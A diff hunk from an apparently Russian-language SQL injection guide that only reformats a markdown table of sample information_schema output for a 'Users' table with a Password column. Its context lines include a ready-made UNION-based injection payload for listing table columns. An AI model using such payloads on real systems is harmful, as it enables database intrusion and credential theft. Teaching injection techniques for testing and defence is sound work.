@@ -103,10 +103,10 @@ MyDatabase	dbo	Feedback	BASE TABLE
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 #### Пример результата:
 | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
-|------|---------------------------------------------------------------|
-| MyDatabase | dbo | Users | UserId | int |
-| MyDatabase | dbo | Users | Username | varchar |
-| MyDatabase | dbo | Users | Password | varchar |
+|---------------|--------------|------------|-------------|-----------|
+| MyDatabase    | dbo          | Users      | UserId      | int       |
+| MyDatabase    | dbo          | Users      | Username    | varchar   |
+| MyDatabase    | dbo          | Users      | Password    | varchar   |
 #### Готовый payload для UNION-атаки:
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--
 
